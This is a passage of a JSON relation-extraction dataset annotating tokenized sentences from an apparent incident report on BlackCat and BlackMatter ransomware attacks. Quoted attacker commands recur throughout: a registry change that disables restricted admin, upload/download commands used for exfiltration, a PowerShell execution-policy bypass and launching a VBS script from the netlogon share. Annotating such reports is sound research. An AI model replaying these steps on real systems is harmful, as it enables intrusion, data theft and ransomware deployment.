"<", "doc", ">", "/home/kali/desktop/", "<", "doc", ">", "1", ">", "\\\\127.0.0.1\\admin", "<", "num", ">", ".", "<", "num", ">", "2", ">", "&", "1"], ["It", "is", "improbable", "that", "the", "attackers", "had", "installed", "Kali", "Linux", "within", "the", "victim", "'s", "network", ",", "which", "suggests", "that", "remote", "system", "control", "was", "achieved", "via", "the", "SSH", "tunnels", "established", "previously", "."], ["It", "is", "possible", "that", "document", "exfiltration", "was", "carried", "out", "via", "executing", "upload/download", "commands", "similar", "to", "those", "described", "above", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "attackers", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [3, 3], "name": "Microsoft Remote Desktop", "pos": [3, 6], "index": "1_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [8, 8], "name": "GUI", "pos": [8, 9], "index": "2_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [68, 68], "name": "attackers", "pos": [13, 14], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [71, 71], "name": "remote commands", "pos": [16, 18], "index": "4_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [156, 156], "name": "attackers", "pos": [5, 6], "index": "5_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [177, 177], "name": "SSH tunnels", "pos": [26, 28], "index": "6_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [186, 186], "name": "document exfiltration", "pos": [4, 6], "index": "7_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [193, 193], "name": "upload/download commands", "pos": [11, 13], "index": "8_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "CD", "evidence": [0], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 0, "t": 3}, {"r": "EX", "evidence": [3], "h": 3, "t": 4}, {"r": "EX", "evidence": [6], "h": 5, "t": 6}, {"r": "WR", "evidence": [6, 7], "h": 5, "t": 7}, {"r": "EX", "evidence": [6, 7], "h": 5, "t": 8}]}, {"title": "029-38", "sents": [["Before", "gaining", "remote", "admin", "access", ",", "the", "following", "impacket", "command", "was", "executed", ":"], ["cmd.exe", "/q", "/c", "reg", "add", "hkey_local_machine\\system\\currentcontrolset\\control\\lsa", "/v", "disablerestrictedadmin", "/t", "reg_dword", "/d", "0", "1", ">", "\\127.0.0.1\\admin", "$", "__", "<", "timestamp", ">", ".", "<", "num", ">", "2", ">", "&", "1"], ["Interestingly", ",", "an", "OPSEC", "mistake", "revealed", "the", "use", "of", "Kali", "Linux", "by", "the", "attackers", "to", "execute", "remote", "commands", "through", "their", "shell", "upload", "and", "download", "commands", ",", "as", "shown", "below", ":"], ["cmd.exe", "/q", "/c", "#", "upload", "c", ":", "\\users", "<", "user", ">", "\\documents", "<", "doc", ">", "/home/kali/desktop/", "<", "doc", ">", "1", ">", "\\127.0.0.1\\admin\\", "<", "num", ">", ".", "<", "num", ">", "2", ">", "&", "1"], ["cmd.exe", "/q", "/c", "#", "download", "c", ":", "\\users\\", "<", "user", ">", "\\documents\\", "<", "doc", ">", "/home/kali/desktop/", "<", "doc", ">", "1", ">", "\\\\127.0.0.1\\admin", "<", "num", ">", ".", "<", "num", ">", "2", ">", "&", "1"], ["It", "is", "improbable", "that", "the", "attackers", "had", "installed", "Kali", "Linux", "within", "the", "victim", "'s", "network", ",", "which", "suggests", "that", "remote", "system", "control", "was", "achieved", "via", "the", "SSH", "tunnels", "established", "previously", "."], ["It", "is", "possible", "that", "document", "exfiltration", "was", "carried", "out", "via", "executing", "upload/download", "commands", "similar", "to", "those", "described", "above", "."], ["Prior", "to", "the", "actual", "ransomware", "execution", "in", "both", "the", "attacks", ",", "the", "attackers", "carried", "out", "several", "preparatory", "actions", "on", "the", "systems", "to", "ensure", "successful", "execution", "."]], "vertexSet": [[{"type": "MP", "sent_id": 2, "global_pos": [54, 54], "name": "attackers", "pos": [13, 14], "index": "0_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [57, 57], "name": "remote commands", "pos": [16, 18], "index": "1_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [142, 142], "name": "attackers", "pos": [5, 6], "index": "2_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [163, 163], "name": "SSH tunnels", "pos": [26, 28], "index": "3_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [172, 172], "name": "document exfiltration", "pos": [4, 6], "index": "4_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [179, 179], "name": "upload/download commands", "pos": [11, 13], "index": "5_0"}]], "labels": [{"r": "EX", "evidence": [2], "h": 0, "t": 1}, {"r": "EX", "evidence": [5], "h": 2, "t": 3}, {"r": "WR", "evidence": [5, 6], "h": 2, "t": 4}, {"r": "EX", "evidence": [5, 6], "h": 2, "t": 5}]}, {"title": "029-39", "sents": [["cmd.exe", "/q", "/c", "reg", "add", "hkey_local_machine\\system\\currentcontrolset\\control\\lsa", "/v", "disablerestrictedadmin", "/t", "reg_dword", "/d", "0", "1", ">", "\\127.0.0.1\\admin", "$", "__", "<", "timestamp", ">", ".", "<", "num", ">", "2", ">", "&", "1"], ["Interestingly", ",", "an", "OPSEC", "mistake", "revealed", "the", "use", "of", "Kali", "Linux", "by", "the", "attackers", "to", "execute", "remote", "commands", "through", "their", "shell", "upload", "and", "download", "commands", ",", "as", "shown", "below", ":"], ["cmd.exe", "/q", "/c", "#", "upload", "c", ":", "\\users", "<", "user", ">", "\\documents", "<", "doc", ">", "/home/kali/desktop/", "<", "doc", ">", "1", ">", "\\127.0.0.1\\admin\\", "<", "num", ">", ".", "<", "num", ">", "2", ">", "&", "1"], ["cmd.exe", "/q", "/c", "#", "download", "c", ":", "\\users\\", "<", "user", ">", "\\documents\\", "<", "doc", ">", "/home/kali/desktop/", "<", "doc", ">", "1", ">", "\\\\127.0.0.1\\admin", "<", "num", ">", ".", "<", "num", ">", "2", ">", "&", "1"], ["It", "is", "improbable", "that", "the", "attackers", "had", "installed", "Kali", "Linux", "within", "the", "victim", "'s", "network", ",", "which", "suggests", "that", "remote", "system", "control", "was", "achieved", "via", "the", "SSH", "tunnels", "established", "previously", "."], ["It", "is", "possible", "that", "document", "exfiltration", "was", "carried", "out", "via", "executing", "upload/download", "commands", "similar", "to", "those", "described", "above", "."], ["Prior", "to", "the", "actual", "ransomware", "execution", "in", "both", "the", "attacks", ",", "the", "attackers", "carried", "out", "several", "preparatory", "actions", "on", "the", "systems", "to", "ensure", "successful", "execution", "."], ["At", "the", "time", "of", "the", "incident", ",", "the", "perpetrator", "accessed", "the", "domain", "controller", "and", "launched", "the", "group", "policy", "management", "interface", "."]], "vertexSet": [[{"type": "MP", "sent_id": 1, "global_pos": [41, 41], "name": "attackers", "pos": [13, 14], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [44, 44], "name": "remote commands", "pos": [16, 18], "index": "1_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [129, 129], "name": "attackers", "pos": [5, 6], "index": "2_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [150, 150], "name": "SSH tunnels", "pos": [26, 28], "index": "3_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [159, 159], "name": "document exfiltration", "pos": [4, 6], "index": "4_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [166, 166], "name": "upload/download commands", "pos": [11, 13], "index": "5_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [208, 208], "name": "perpetrator", "pos": [8, 9], "index": "6_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [216, 216], "name": "group policy management interface", "pos": [16, 20], "index": "7_0"}]], "labels": [{"r": "EX", "evidence": [1], "h": 0, "t": 1}, {"r": "EX", "evidence": [4], "h": 2, "t": 3}, {"r": "WR", "evidence": [4, 5], "h": 2, "t": 4}, {"r": "EX", "evidence": [4, 5], "h": 2, "t": 5}, {"r": "RD", "evidence": [7], "h": 6, "t": 7}]}, {"title": "029-40", "sents": [["Interestingly", ",", "an", "OPSEC", "mistake", "revealed", "the", "use", "of", "Kali", "Linux", "by", "the", "attackers", "to", "execute", "remote", "commands", "through", "their", "shell", "upload", "and", "download", "commands", ",", "as", "shown", "below", ":"], ["cmd.exe", "/q", "/c", "#", "upload", "c", ":", "\\users", "<", "user", ">", "\\documents", "<", "doc", ">", "/home/kali/desktop/", "<", "doc", ">", "1", ">", "\\127.0.0.1\\admin\\", "<", "num", ">", ".", "<", "num", ">", "2", ">", "&", "1"], ["cmd.exe", "/q", "/c", "#", "download", "c", ":", "\\users\\", "<", "user", ">", "\\documents\\", "<", "doc", ">", "/home/kali/desktop/", "<", "doc", ">", "1", ">", "\\\\127.0.0.1\\admin", "<", "num", ">", ".", "<", "num", ">", "2", ">", "&", "1"], ["It", "is", "improbable", "that", "the", "attackers", "had", "installed", "Kali", "Linux", "within", "the", "victim", "'s", "network", ",", "which", "suggests", "that", "remote", "system", "control", "was", "achieved", "via", "the", "SSH", "tunnels", "established", "previously", "."], ["It", "is", "possible", "that", "document", "exfiltration", "was", "carried", "out", "via", "executing", "upload/download", "commands", "similar", "to", "those", "described", "above", "."], ["Prior", "to", "the", "actual", "ransomware", "execution", "in", "both", "the", "attacks", ",", "the", "attackers", "carried", "out", "several", "preparatory", "actions", "on", "the", "systems", "to", "ensure", "successful", "execution", "."], ["At", "the", "time", "of", "the", "incident", ",", "the", "perpetrator", "accessed", "the", "domain", "controller", "and", "launched", "the", "group", "policy", "management", "interface", "."], ["Next", ",", "the", "attacker", "introduced", "and", "ran", "a", "file", "known", "as", "``", "apply.ps1", ".", "''", "The", "execution", "command", "utilized", "was", ":"]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [13, 13], "name": "attackers", "pos": [13, 14], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [16, 16], "name": "remote commands", "pos": [16, 18], "index": "1_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [101, 101], "name": "attackers", "pos": [5, 6], "index": "2_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [122, 122], "name": "SSH tunnels", "pos": [26, 28], "index": "3_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [131, 131], "name": "document exfiltration", "pos": [4, 6], "index": "4_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [138, 138], "name": "upload/download commands", "pos": [11, 13], "index": "5_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [180, 180], "name": "perpetrator", "pos": [8, 9], "index": "6_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [188, 188], "name": "group policy management interface", "pos": [16, 20], "index": "7_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [196, 196], "name": "attacker", "pos": [3, 4], "index": "8_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [205, 205], "name": "apply.ps1", "pos": [12, 13], "index": "9_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "EX", "evidence": [3], "h": 2, "t": 3}, {"r": "WR", "evidence": [3, 4], "h": 2, "t": 4}, {"r": "EX", "evidence": [3, 4], "h": 2, "t": 5}, {"r": "RD", "evidence": [6], "h": 6, "t": 7}, {"r": "CO", "evidence": [6, 7], "h": 6, "t": 8}, {"r": "WR", "evidence": [7], "h": 8, "t": 9}, {"r": "EX", "evidence": [7], "h": 8, "t": 9}]}, {"title": "029-41", "sents": [["cmd.exe", "/q", "/c", "#", "upload", "c", ":", "\\users", "<", "user", ">", "\\documents", "<", "doc", ">", "/home/kali/desktop/", "<", "doc", ">", "1", ">", "\\127.0.0.1\\admin\\", "<", "num", ">", ".", "<", "num", ">", "2", ">", "&", "1"], ["cmd.exe", "/q", "/c", "#", "download", "c", ":", "\\users\\", "<", "user", ">", "\\documents\\", "<", "doc", ">", "/home/kali/desktop/", "<", "doc", ">", "1", ">", "\\\\127.0.0.1\\admin", "<", "num", ">", ".", "<", "num", ">", "2", ">", "&", "1"], ["It", "is", "improbable", "that", "the", "attackers", "had", "installed", "Kali", "Linux", "within", "the", "victim", "'s", "network", ",", "which", "suggests", "that", "remote", "system", "control", "was", "achieved", "via", "the", "SSH", "tunnels", "established", "previously", "."], ["It", "is", "possible", "that", "document", "exfiltration", "was", "carried", "out", "via", "executing", "upload/download", "commands", "similar", "to", "those", "described", "above", "."], ["Prior", "to", "the", "actual", "ransomware", "execution", "in", "both", "the", "attacks", ",", "the", "attackers", "carried", "out", "several", "preparatory", "actions", "on", "the", "systems", "to", "ensure", "successful", "execution", "."], ["At", "the", "time", "of", "the", "incident", ",", "the", "perpetrator", "accessed", "the", "domain", "controller", "and", "launched", "the", "group", "policy", "management", "interface", "."], ["Next", ",", "the", "attacker", "introduced", "and", "ran", "a", "file", "known", "as", "``", "apply.ps1", ".", "''", "The", "execution", "command", "utilized", "was", ":"], ["``", "c", ":", "\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe", "-exec", "bypass", ".\\apply.ps1", "''", "."]], "vertexSet": [[{"type": "MP", "sent_id": 2, "global_pos": [71, 71], "name": "attackers", "pos": [5, 6], "index": "0_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [92, 92], "name": "SSH tunnels", "pos": [26, 28], "index": "1_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [101, 101], "name": "document exfiltration", "pos": [4, 6], "index": "2_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [108, 108], "name": "upload/download commands", "pos": [11, 13], "index": "3_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [150, 150], "name": "perpetrator", "pos": [8, 9], "index": "4_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [158, 158], "name": "group policy management interface", "pos": [16, 20], "index": "5_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [166, 166], "name": "attacker", "pos": [3, 4], "index": "6_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [175, 175], "name": "apply.ps1", "pos": [12, 13], "index": "7_0"}]], "labels": [{"r": "EX", "evidence": [2], "h": 0, "t": 1}, {"r": "WR", "evidence": [2, 3], "h": 0, "t": 2}, {"r": "EX", "evidence": [2, 3], "h": 0, "t": 3}, {"r": "RD", "evidence": [5], "h": 4, "t": 5}, {"r": "CO", "evidence": [5, 6], "h": 4, "t": 6}, {"r": "WR", "evidence": [6], "h": 6, "t": 7}, {"r": "EX", "evidence": [6], "h": 6, "t": 7}]}, {"title": "029-42", "sents": [["cmd.exe", "/q", "/c", "#", "download", "c", ":", "\\users\\", "<", "user", ">", "\\documents\\", "<", "doc", ">", "/home/kali/desktop/", "<", "doc", ">", "1", ">", "\\\\127.0.0.1\\admin", "<", "num", ">", ".", "<", "num", ">", "2", ">", "&", "1"], ["It", "is", "improbable", "that", "the", "attackers", "had", "installed", "Kali", "Linux", "within", "the", "victim", "'s", "network", ",", "which", "suggests", "that", "remote", "system", "control", "was", "achieved", "via", "the", "SSH", "tunnels", "established", "previously", "."], ["It", "is", "possible", "that", "document", "exfiltration", "was", "carried", "out", "via", "executing", "upload/download", "commands", "similar", "to", "those", "described", "above", "."], ["Prior", "to", "the", "actual", "ransomware", "execution", "in", "both", "the", "attacks", ",", "the", "attackers", "carried", "out", "several", "preparatory", "actions", "on", "the", "systems", "to", "ensure", "successful", "execution", "."], ["At", "the", "time", "of", "the", "incident", ",", "the", "perpetrator", "accessed", "the", "domain", "controller", "and", "launched", "the", "group", "policy", "management", "interface", "."], ["Next", ",", "the", "attacker", "introduced", "and", "ran", "a", "file", "known", "as", "``", "apply.ps1", ".", "''", "The", "execution", "command", "utilized", "was", ":"], ["``", "c", ":", "\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe", "-exec", "bypass", ".\\apply.ps1", "''", "."], ["This", "action", "led", "to", "the", "immediate", "storage", "of", "group", "policy", "files", "on", "the", "disk", "."]], "vertexSet": [[{"type": "MP", "sent_id": 1, "global_pos": [38, 38], "name": "attackers", "pos": [5, 6], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [59, 59], "name": "SSH tunnels", "pos": [26, 28], "index": "1_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [68, 68], "name": "document exfiltration", "pos": [4, 6], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [75, 75], "name": "upload/download commands", "pos": [11, 13], "index": "3_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [117, 117], "name": "perpetrator", "pos": [8, 9], "index": "4_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [125, 125], "name": "group policy management interface", "pos": [16, 20], "index": "5_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [133, 133], "name": "attacker", "pos": [3, 4], "index": "6_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [142, 142], "name": "apply.ps1", "pos": [12, 13], "index": "7_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [168, 168], "name": "group policy files", "pos": [8, 11], "index": "8_0"}]], "labels": [{"r": "EX", "evidence": [1], "h": 0, "t": 1}, {"r": "WR", "evidence": [1, 2], "h": 0, "t": 2}, {"r": "EX", "evidence": [1, 2], "h": 0, "t": 3}, {"r": "RD", "evidence": [4], "h": 4, "t": 5}, {"r": "WR", "evidence": [4, 5, 6, 7], "h": 4, "t": 8}, {"r": "CO", "evidence": [4, 5], "h": 4, "t": 6}, {"r": "WR", "evidence": [5], "h": 6, "t": 7}, {"r": "EX", "evidence": [5], "h": 6, "t": 7}]}, {"title": "029-43", "sents": [["It", "is", "improbable", "that", "the", "attackers", "had", "installed", "Kali", "Linux", "within", "the", "victim", "'s", "network", ",", "which", "suggests", "that", "remote", "system", "control", "was", "achieved", "via", "the", "SSH", "tunnels", "established", "previously", "."], ["It", "is", "possible", "that", "document", "exfiltration", "was", "carried", "out", "via", "executing", "upload/download", "commands", "similar", "to", "those", "described", "above", "."], ["Prior", "to", "the", "actual", "ransomware", "execution", "in", "both", "the", "attacks", ",", "the", "attackers", "carried", "out", "several", "preparatory", "actions", "on", "the", "systems", "to", "ensure", "successful", "execution", "."], ["At", "the", "time", "of", "the", "incident", ",", "the", "perpetrator", "accessed", "the", "domain", "controller", "and", "launched", "the", "group", "policy", "management", "interface", "."], ["Next", ",", "the", "attacker", "introduced", "and", "ran", "a", "file", "known", "as", "``", "apply.ps1", ".", "''", "The", "execution", "command", "utilized", "was", ":"], ["``", "c", ":", "\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe", "-exec", "bypass", ".\\apply.ps1", "''", "."], ["This", "action", "led", "to", "the", "immediate", "storage", "of", "group", "policy", "files", "on", "the", "disk", "."], ["Following", "this", ",", "the", "attackers", "used", "a", "command", "to", "enforce", "the", "deployment", "of", "the", "group", "policy", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [5, 5], "name": "attackers", "pos": [5, 6], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [26, 26], "name": "SSH tunnels", "pos": [26, 28], "index": "1_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [35, 35], "name": "document exfiltration", "pos": [4, 6], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [42, 42], "name": "upload/download commands", "pos": [11, 13], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [84, 84], "name": "perpetrator", "pos": [8, 9], "index": "4_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [92, 92], "name": "group policy management interface", "pos": [16, 20], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [100, 100], "name": "attacker", "pos": [3, 4], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [109, 109], "name": "apply.ps1", "pos": [12, 13], "index": "7_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [135, 135], "name": "group policy files", "pos": [8, 11], "index": "8_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [146, 146], "name": "attackers", "pos": [4, 5], "index": "9_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [149, 149], "name": "command", "pos": [7, 8], "index": "10_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [156, 156], "name": "group policy", "pos": [14, 16], "index": "11_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "EX", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "RD", "evidence": [3], "h": 4, "t": 5}, {"r": "WR", "evidence": [3, 4, 5, 6], "h": 4, "t": 8}, {"r": "CO", "evidence": [3, 4], "h": 4, "t": 6}, {"r": "WR", "evidence": [4], "h": 6, "t": 7}, {"r": "EX", "evidence": [4], "h": 6, "t": 7}, {"r": "WR", "evidence": [6, 7], "t": 8, "h": 9}, {"r": "EX", "evidence": [7], "h": 9, "t": 10}, {"r": "WR", "evidence": [7], "h": 9, "t": 11}]}, {"title": "029-44", "sents": [["It", "is", "possible", "that", "document", "exfiltration", "was", "carried", "out", "via", "executing", "upload/download", "commands", "similar", "to", "those", "described", "above", "."], ["Prior", "to", "the", "actual", "ransomware", "execution", "in", "both", "the", "attacks", ",", "the", "attackers", "carried", "out", "several", "preparatory", "actions", "on", "the", "systems", "to", "ensure", "successful", "execution", "."], ["At", "the", "time", "of", "the", "incident", ",", "the", "perpetrator", "accessed", "the", "domain", "controller", "and", "launched", "the", "group", "policy", "management", "interface", "."], ["Next", ",", "the", "attacker", "introduced", "and", "ran", "a", "file", "known", "as", "``", "apply.ps1", ".", "''", "The", "execution", "command", "utilized", "was", ":"], ["``", "c", ":", "\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe", "-exec", "bypass", ".\\apply.ps1", "''", "."], ["This", "action", "led", "to", "the", "immediate", "storage", "of", "group", "policy", "files", "on", "the", "disk", "."], ["Following", "this", ",", "the", "attackers", "used", "a", "command", "to", "enforce", "the", "deployment", "of", "the", "group", "policy", "."], ["Shortly", "before", "the", "commencement", "of", "BlackCat", "ransomware", "'s", "encryption", "of", "files", ",", "the", "intruders", "initiated", "a", "script", "named", "``", "defender.vbs", ".", "''"]], "vertexSet": [[{"type": "TF", "sent_id": 0, "global_pos": [4, 4], "name": "document exfiltration", "pos": [4, 6], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [11, 11], "name": "upload/download commands", "pos": [11, 13], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [53, 53], "name": "perpetrator", "pos": [8, 9], "index": "2_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [61, 61], "name": "group policy management interface", "pos": [16, 20], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [69, 69], "name": "attacker", "pos": [3, 4], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [78, 78], "name": "apply.ps1", "pos": [12, 13], "index": "5_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [104, 104], "name": "group policy files", "pos": [8, 11], "index": "6_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [115, 115], "name": "attackers", "pos": [4, 5], "index": "7_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [118, 118], "name": "command", "pos": [7, 8], "index": "8_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [125, 125], "name": "group policy", "pos": [14, 16], "index": "9_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [133, 133], "name": "BlackCat ransomware", "pos": [5, 7], "index": "10_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [147, 147], "name": "defender.vbs", "pos": [19, 20], "index": "11_0"}]], "labels": [{"r": "RD", "evidence": [2], "h": 2, "t": 3}, {"r": "WR", "evidence": [2, 3, 4, 5], "h": 2, "t": 6}, {"r": "CO", "evidence": [2, 3], "h": 2, "t": 4}, {"r": "WR", "evidence": [3], "h": 4, "t": 5}, {"r": "EX", "evidence": [3], "h": 4, "t": 5}, {"r": "WR", "evidence": [5, 6], "t": 6, "h": 7}, {"r": "EX", "evidence": [6], "h": 7, "t": 8}, {"r": "WR", "evidence": [6], "h": 7, "t": 9}, {"r": "CO", "evidence": [6, 7], "h": 7, "t": 10}, {"r": "EX", "evidence": [7], "h": 10, "t": 11}]}, {"title": "029-45", "sents": [["Prior", "to", "the", "actual", "ransomware", "execution", "in", "both", "the", "attacks", ",", "the", "attackers", "carried", "out", "several", "preparatory", "actions", "on", "the", "systems", "to", "ensure", "successful", "execution", "."], ["At", "the", "time", "of", "the", "incident", ",", "the", "perpetrator", "accessed", "the", "domain", "controller", "and", "launched", "the", "group", "policy", "management", "interface", "."], ["Next", ",", "the", "attacker", "introduced", "and", "ran", "a", "file", "known", "as", "``", "apply.ps1", ".", "''", "The", "execution", "command", "utilized", "was", ":"], ["``", "c", ":", "\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe", "-exec", "bypass", ".\\apply.ps1", "''", "."], ["This", "action", "led", "to", "the", "immediate", "storage", "of", "group", "policy", "files", "on", "the", "disk", "."], ["Following", "this", ",", "the", "attackers", "used", "a", "command", "to", "enforce", "the", "deployment", "of", "the", "group", "policy", "."], ["Shortly", "before", "the", "commencement", "of", "BlackCat", "ransomware", "'s", "encryption", "of", "files", ",", "the", "intruders", "initiated", "a", "script", "named", "``", "defender.vbs", ".", "''"], ["In", "the", "BlackMatter", "attack", ",", "a", "file", "with", "the", "same", "content", "was", "named", "``", "def.vbs", "''", "and", "executed", "a", "few", "moments", "before", "the", "encryption", "procedure", "began", "."]], "vertexSet": [[{"type": "MP", "sent_id": 1, "global_pos": [34, 34], "name": "perpetrator", "pos": [8, 9], "index": "0_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [42, 42], "name": "group policy management interface", "pos": [16, 20], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [50, 50], "name": "attacker", "pos": [3, 4], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [59, 59], "name": "apply.ps1", "pos": [12, 13], "index": "3_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [85, 85], "name": "group policy files", "pos": [8, 11], "index": "4_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [96, 96], "name": "attackers", "pos": [4, 5], "index": "5_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [99, 99], "name": "command", "pos": [7, 8], "index": "6_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [106, 106], "name": "group policy", "pos": [14, 16], "index": "7_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [114, 114], "name": "BlackCat ransomware", "pos": [5, 7], "index": "8_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [128, 128], "name": "defender.vbs", "pos": [19, 20], "index": "9_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [133, 133], "name": "BlackMatter attack", "pos": [2, 4], "index": "10_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [145, 145], "name": "def.vbs", "pos": [14, 15], "index": "11_0"}]], "labels": [{"r": "RD", "evidence": [1], "h": 0, "t": 1}, {"r": "WR", "evidence": [1, 2, 3, 4], "h": 0, "t": 4}, {"r": "CO", "evidence": [1, 2], "h": 0, "t": 2}, {"r": "WR", "evidence": [2], "h": 2, "t": 3}, {"r": "EX", "evidence": [2], "h": 2, "t": 3}, {"r": "WR", "evidence": [4, 5], "t": 4, "h": 5}, {"r": "EX", "evidence": [5], "h": 5, "t": 6}, {"r": "WR", "evidence": [5], "h": 5, "t": 7}, {"r": "CO", "evidence": [5, 6], "h": 5, "t": 8}, {"r": "CO", "evidence": [5, 6, 7], "h": 5, "t": 10}, {"r": "EX", "evidence": [6], "h": 8, "t": 9}, {"r": "WR", "evidence": [7], "h": 10, "t": 11}, {"r": "EX", "evidence": [7], "h": 10, "t": 11}]}, {"title": "029-46", "sents": [["At", "the", "time", "of", "the", "incident", ",", "the", "perpetrator", "accessed", "the", "domain", "controller", "and", "launched", "the", "group", "policy", "management", "interface", "."], ["Next", ",", "the", "attacker", "introduced", "and", "ran", "a", "file", "known", "as", "``", "apply.ps1", ".", "''", "The", "execution", "command", "utilized", "was", ":"], ["``", "c", ":", "\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe", "-exec", "bypass", ".\\apply.ps1", "''", "."], ["This", "action", "led", "to", "the", "immediate", "storage", "of", "group", "policy", "files", "on", "the", "disk", "."], ["Following", "this", ",", "the", "attackers", "used", "a", "command", "to", "enforce", "the", "deployment", "of", "the", "group", "policy", "."], ["Shortly", "before", "the", "commencement", "of", "BlackCat", "ransomware", "'s", "encryption", "of", "files", ",", "the", "intruders", "initiated", "a", "script", "named", "``", "defender.vbs", ".", "''"], ["In", "the", "BlackMatter", "attack", ",", "a", "file", "with", "the", "same", "content", "was", "named", "``", "def.vbs", "''", "and", "executed", "a", "few", "moments", "before", "the", "encryption", "procedure", "began", "."], ["The", "command", "used", "for", "execution", "was", "``", "cmd.exe", "/c", "\\", "<", "domaincontroller", ">", "\\netlogon\\def.vbs", "''", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [8, 8], "name": "perpetrator", "pos": [8, 9], "index": "0_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [16, 16], "name": "group policy management interface", "pos": [16, 20], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [24, 24], "name": "attacker", "pos": [3, 4], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [33, 33], "name": "apply.ps1", "pos": [12, 13], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [59, 59], "name": "group policy files", "pos": [8, 11], "index": "4_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [70, 70], "name": "attackers", "pos": [4, 5], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [73, 73], "name": "command", "pos": [7, 8], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [80, 80], "name": "group policy", "pos": [14, 16], "index": "7_0"}], [{"type": 